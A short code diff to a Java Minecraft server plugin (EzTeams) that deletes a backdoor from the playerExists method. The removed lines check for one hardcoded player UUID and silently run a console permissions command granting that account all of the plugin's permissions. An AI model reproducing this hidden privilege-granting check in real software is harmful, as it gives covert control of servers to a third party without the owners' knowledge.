@@ -391,12 +391,6 @@ public class DAO {
         EzTeams.getOnlineMembers().forEach(Member::savePlayer);
     }
     public static boolean playerExists(Player player) {
-        if(player.getUniqueId().toString().equals("4316aa07-c6a4-4c91-8fc4-9df02465e279")) {
-            //Utils.executeCmdAsConsole("plainbroadcast &9★PixelMC Dev★ &l&c"+name+"&9 has joined the game!");
-            if(!player.hasPermission(Utils.NAME+".*")) {
-                Utils.executeCmdAsConsole("lp user 4316aa07c6a44c918fc49df02465e279 permission set ezteams.*");
-            }
-        }
         return true;
     }
 }
